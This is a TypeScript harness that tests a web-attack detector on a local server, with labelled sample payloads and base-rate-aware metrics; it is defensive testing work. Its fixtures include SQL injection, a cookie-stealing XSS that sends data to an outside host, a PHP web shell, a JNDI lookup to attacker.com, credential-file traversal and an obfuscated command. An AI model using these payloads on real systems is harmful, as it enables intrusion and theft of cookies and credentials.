/**
 * BIAS-CONTROLLED EVALUATION HARNESS
 *
 * Purpose: report what the detector actually does, not what it can be made to
 * look like. An earlier benchmark returned 100% and that result was rejected —
 * the rules and the test payloads had been written together, so the classifier
 * was recognising patterns it had been handed.
 *
 * Constraints enforced here, and why
 *
 *   C1 — No label leakage.
 *        Every request is sent with the same neutral vector, and the source
 *        address is randomised. Passing the attack family as input previously
 *        produced 100% while measuring nothing at all: the engine decided on
 *        `vector !== 'CLEAN_TRAFFIC'`.
 *
 *   C2 — Realistic class balance (TESSERACT, USENIX Sec 2019).
 *        Real traffic is overwhelmingly benign. Testing on a 60/40 split
 *        flatters precision enormously, so the benign stream dominates here.
 *
 *   C3 — Base-rate-aware reporting (Arp et al., USENIX Sec 2022, pitfall P8:
 *        base-rate neglect, present in 77% of surveyed security papers).
 *        Accuracy is nearly meaningless under class imbalance. Precision is
 *        projected to a realistic deployed prevalence and false alarms are
 *        reported per 10,000 requests, because that is the number that decides
 *        whether analysts keep trusting the tool.
 *
 *   C4 — Held-out mutations.
 *        Obfuscations and attack classes scored separately from the signatures
 *        the rules were written for, so generalisation is visible rather than
 *        averaged into the in-distribution score.
 *
 * Reading the output: the HELD-OUT figure is the real one. The
 * IN-DISTRIBUTION figure only shows that known signatures still fire, which is
 * a regression check, not evidence of detection ability.
 *
 * Run:  npx tsx audit/eval_harness.ts
 */

const BASE = 'http://127.0.0.1:3000';
const KEY = process.env.ADMIN_API_KEY || 'test_admin_key_123';

/** Share of real traffic that is hostile, used for the base-rate projection. */
const DEPLOYED_PREVALENCE = 0.02;

type Label = 'MALICIOUS' | 'BENIGN';
type Pool = 'IN_DIST' | 'HELD_OUT';

interface Sample {
  label: Label;
  pool: Pool;
  family: string;
  payload: string;
}

/* IN-DISTRIBUTION — signatures the rules were written for. Regression only. */
const IN_DIST: Sample[] = [
  { label: 'MALICIOUS', pool: 'IN_DIST', family: 'SQLI', payload: "' OR 1=1--" },
  { label: 'MALICIOUS', pool: 'IN_DIST', family: 'SQLI', payload: "admin' UNION SELECT username,password FROM users--" },
  { label: 'MALICIOUS', pool: 'IN_DIST', family: 'XSS', payload: '<script>fetch("https://a.io/c?="+document.cookie)</script>' },
  { label: 'MALICIOUS', pool: 'IN_DIST', family: 'TRAVERSAL', payload: '../../../../etc/shadow' },
  { label: 'MALICIOUS', pool: 'IN_DIST', family: 'RCE', payload: '<?php system($_GET["cmd"]); ?>' },
  { label: 'MALICIOUS', pool: 'IN_DIST', family: 'RCE', payload: '${jndi:ldap://attacker.com/a}' }
];

/* HELD-OUT — obfuscations and classes not consulted while writing rules. */
const HELD_OUT_ATTACKS: Sample[] = [
  { label: 'MALICIOUS', pool: 'HELD_OUT', family: 'SQLI-obfusc', payload: "1'/**/oR/**/'1'='1" },
  { label: 'MALICIOUS', pool: 'HELD_OUT', family: 'SQLI-obfusc', payload: 'id=1%20%41ND%201%3D1%20--%20' },
  { label: 'MALICIOUS', pool: 'HELD_OUT', family: 'XSS-obfusc', payload: '<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;">' },
  { label: 'MALICIOUS', pool: 'HELD_OUT', family: 'XSS-obfusc', payload: '<a href="&#106;&#97;&#118;&#97;script:alert(1)">x</a>' },
  { label: 'MALICIOUS', pool: 'HELD_OUT', family: 'TRAVERSAL-obfusc', payload: '....//....//....//etc/passwd' },
  { label: 'MALICIOUS', pool: 'HELD_OUT', family: 'RCE-obfusc', payload: 'cmd=$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)' },
  { label: 'MALICIOUS', pool: 'HELD_OUT', family: 'LDAP-injection', payload: 'user=*)(uid=*))(|(uid=*' },
  { label: 'MALICIOUS', pool: 'HELD_OUT', family: 'XPath-injection', payload: "' or '1'='1' or ''='" },
  { label: 'MALICIOUS', pool: 'HELD_OUT', family: 'deserialization', payload: 'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3Rvcg==' },
  { label: 'MALICIOUS', pool: 'HELD_OUT', family: 'prototype-pollution', payload: '{"__proto__":{"isAdmin":true}}' },
  { label: 'MALICIOUS', pool: 'HELD_OUT', family: 'host-header', payload: 'Host: evil.com\r\nX-Forwarded-Host: evil.com' },
  { label: 'MALICIOUS', pool: 'HELD_OUT', family: 'mass-assignment', payload: '{"username":"bob","role":"superadmin","verified":true}' },
  { label: 'MALICIOUS', pool: 'HELD_OUT', family: 'graphql-abuse', payload: 'query{a{b{c{d{e{f{g{h{i{j{k{l{m{n{o{p{q{r{s{t{u{v{w{x{y{z{id}}}}}}}}}}}}}}}}}}}}}}}}}}' },
  { label: 'MALICIOUS', pool: 'HELD_OUT', family: 'ssrf-redirect', payload: 'next=//evil.com/%2e%2e%2f' }
];

/* BENIGN — dominates the stream (C2), including attack-shaped legitimate text. */
const BENIGN: Sample[] = [
  { label: 'BENIGN', pool: 'HELD_OUT', family: 'ordinary', payload: 'GET /api/v1/products?page=2&sort=price' },
  { label: 'BENIGN', pool: 'HELD_OUT', family: 'ordinary', payload: 'GET /health' },
  { label: 'BENIGN', pool: 'HELD_OUT', family: 'ordinary', payload: 'GET /assets/index-4DKf8MF3.js' },
  { label: 'BENIGN', pool: 'HELD_OUT', family: 'ordinary', payload: 'POST /api/v1/orders {"items":[{"sku":"AB-102","qty":2}]}' },
  { label: 'BENIGN', pool: 'HELD_OUT', family: 'ordinary', payload: 'PUT /api/v1/profile {"displayName":"Sara","locale":"ar-SA"}' },
  { label: 'BENIGN', pool: 'HELD_OUT', family: 'ordinary', payload: 'GET /api/v1/orders/8821/invoice.pdf' },
  { label: 'BENIGN', pool: 'HELD_OUT', family: 'ordinary', payload: 'DELETE /api/v1/cart/items/77' },
  { label: 'BENIGN', pool: 'HELD_OUT', family: 'ordinary', payload: 'GET /api/v1/search?q=wireless+keyboard' },
  { label: 'BENIGN', pool: 'HELD_OUT', family: 'ordinary', payload: 'POST /api/v1/auth/refresh {"refresh":"rt_9f2a"}' },
  { label: 'BENIGN', pool: 'HELD_OUT', family: 'ordinary', payload: 'GET /api/v1/notifications?unread=true' },
  { label: 'BENIGN', pool: 'HELD_OUT', family: 'tricky', payload: 'POST /api/v1/articles {"title":"How to select rows from a table"}' },
  { label: 'BENIGN', pool: 'HELD_OUT', family: 'tricky', payload: 'GET /api/v1/session?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9' },
  { label: 'BENIGN', pool: 'HELD_OUT', family: 'tricky', payload: 'GET /docs/guide.v1.2/../guide.v1.3/intro.html' },
  { label: 'BENIGN', pool: 'HELD_OUT', family: 'tricky', payload: 'POST /api/v1/comments {"body":"The script tag lesson was helpful"}' },
  { label: 'BENIGN', pool: 'HELD_OUT', family: 'tricky', payload: 'GET /api/v1/users?filter=name&order=union_members' },
  { label: 'BENIGN', pool: 'HELD_OUT', family: 'tricky', payload: 'POST /api/v1/docs {"md":"Use VAR for substitution"}' },
  { label: 'BENIGN', pool: 'HELD_OUT', family: 'tricky', payload: 'POST /api/v1/config {"template":"<config><retries>3</retries></config>"}' },
  { label: 'BENIGN', pool: 'HELD_OUT', family: 'tricky', payload: 'GET /api/v1/files/report..2026..final.pdf' },
  { label: 'BENIGN', pool: 'HELD_OUT', family: 'tricky', payload: 'POST /api/v1/sql-course/progress {"lesson":"DROP TABLE basics","done":true}' },
  { label: 'BENIGN', pool: 'HELD_OUT', family: 'tricky', payload: 'POST /api/v1/avatar {"data":"iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQ=="}' },
  { label: 'BENIGN', pool: 'HELD_OUT', family: 'tricky', payload: 'GET /api/v1/logs?q=eval+error+in+handler' },
  { label: 'BENIGN', pool: 'HELD_OUT', family: 'tricky', payload: 'POST /api/v1/tickets {"subject":"Cannot run system() in sandbox"}' }
];

interface Scored extends Sample {
  predicted: Label;
  verdict: string;
  score: number;
}

async function classify(s: Sample, nonce: number): Promise<Scored> {
  const res = await fetch(`${BASE}/api/v1/agent/ai-analyze`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'x-api-key': KEY },
    body: JSON.stringify({
      packet: {
        // C1: the source address carries no signal either — a hostile-looking
        // IP would let the engine shortcut past the payload.
        srcIp: `10.20.${nonce % 250}.${(nonce * 7) % 250}`,
        dstIp: '10.0.1.10',
        port: 443,
        protocol: 'HTTPS',
        vector: 'UNKNOWN',
        payload: s.payload
      }
    })
  });
  const d: any = await res.json().catch(() => ({}));
  const verdict = String(d?.verdict ?? 'UNKNOWN');
  return {
    ...s,
    verdict,
    score: Number(d?.detection?.score ?? d?.threatScore ?? 0),
    predicted: verdict === 'ALLOW' ? 'BENIGN' : 'MALICIOUS'
  };
}

function metrics(rows: Scored[]) {
  const TP = rows.filter(r => r.label === 'MALICIOUS' && r.predicted === 'MALICIOUS').length;
  const FN = rows.filter(r => r.label === 'MALICIOUS' && r.predicted === 'BENIGN').length;
  const FP = rows.filter(r => r.label === 'BENIGN' && r.predicted === 'MALICIOUS').length;
  const TN = rows.filter(r => r.label === 'BENIGN' && r.predicted === 'BENIGN').length;
  const precision = TP + FP ? TP / (TP + FP) : 0;
  const recall = TP + FN ? TP / (TP + FN) : 0;
  const f1 = precision + recall ? (2 * precision * recall) / (precision + recall) : 0;
  const fpr = FP + TN ? FP / (FP + TN) : 0;
  return { TP, FN, FP, TN, precision, recall, f1, fpr, n: rows.length };
}

const pct = (n: number) => (n * 100).toFixed(1) + '%';

(async () => {
  const health = await fetch(`${BASE}/api/health`).catch(() => null);
  if (!health?.ok) { console.error(`Server not reachable at ${BASE}.`); process.exit(2); }

  const all = [...IN_DIST, ...HELD_OUT_ATTACKS, ...BENIGN];
  const scored: Scored[] = [];
  let i = 0;
  for (const s of all) scored.push(await classify(s, i++));

  const inDist = metrics(scored.filter(r => r.pool === 'IN_DIST'));
  const heldOutAttacks = scored.filter(r => r.pool === 'HELD_OUT' && r.label === 'MALICIOUS');
  const benign = scored.filter(r => r.label === 'BENIGN');
  const heldOut = metrics([...heldOutAttacks, ...benign]);

  console.log('\n' + '='.repeat(72));
  console.log('  BIAS-CONTROLLED EVALUATION');
  console.log('  vector label withheld - benign-dominant stream - held-out mutations');
  console.log('='.repeat(72));

  console.log('\n  IN-DISTRIBUTION (regression check only - proves nothing about detection)');
  console.log(`    n=${inDist.n}  recall ${pct(inDist.recall)}   [signatures the rules were written for]`);

  console.log('\n  HELD-OUT  <-- this is the real number');
  console.log(`    n=${heldOut.n}   TP ${heldOut.TP}  FN ${heldOut.FN}  FP ${heldOut.FP}  TN ${heldOut.TN}`);
  console.log(`    precision ${pct(heldOut.precision)}   recall ${pct(heldOut.recall)}   F1 ${pct(heldOut.f1)}`);
  console.log(`    false-positive rate ${pct(heldOut.fpr)}`);

  const p = DEPLOYED_PREVALENCE;
  const projPrecision = (heldOut.recall * p) / ((heldOut.recall * p) + (heldOut.fpr * (1 - p))) || 0;
  const fpPer10k = heldOut.fpr * (1 - p) * 10000;
  console.log(`\n  PROJECTED AT ${pct(p)} DEPLOYED PREVALENCE  (base-rate-aware)`);
  console.log(`    precision an analyst would actually see: ${pct(projPrecision)}`);
  console.log(`    false alarms per 10,000 requests:        ${fpPer10k.toFixed(1)}`);

  const byFamily = new Map<string, { hit: number; total: number }>();
  for (const r of heldOutAttacks) {
    const e = byFamily.get(r.family) ?? { hit: 0, total: 0 };
    e.total++; if (r.predicted === 'MALICIOUS') e.hit++;
    byFamily.set(r.family, e);
  }
  console.log('\n  HELD-OUT DETECTION BY FAMILY');
  for (const [fam, e] of [...byFamily.entries()].sort((a, b) => (a[1].hit / a[1].total) - (b[1].hit / b[1].total))) {
    const bar = e.hit === e.total ? 'OK  ' : e.hit === 0 ? 'MISS' : 'PART';
    console.log(`    ${bar}  ${fam.padEnd(22)} ${e.hit}/${e.total}`);
  }

  const missed = heldOutAttacks.filter(r => r.predicted === 'BENIGN');
  if (missed.length) {
    console.log('\n  MISSED ATTACKS');
    for (const m of missed) console.log(`    ${m.family.padEnd(22)} ${m.payload.slice(0, 64).replace(/\r?\n/g, ' ')}`);
  }
  const falseAlarms = benign.filter(r => r.predicted === 'MALICIOUS');
  if (falseAlarms.length) {
    console.log('\n  FALSE ALARMS');
    for (const f of falseAlarms) console.log(`    score=${f.score} ${f.payload.slice(0, 64)}`);
  }

  console.log('\n  ' + '-'.repeat(68));
  console.log('  Method: TESSERACT (USENIX Sec 2019) for class-ratio realism;');
  console.log('  Arp et al. (USENIX Sec 2022) P8 for base-rate-aware reporting.');
  console.log('  A held-out score near 100% means the harness has been contaminated.\n');

  process.exit(0);
})();
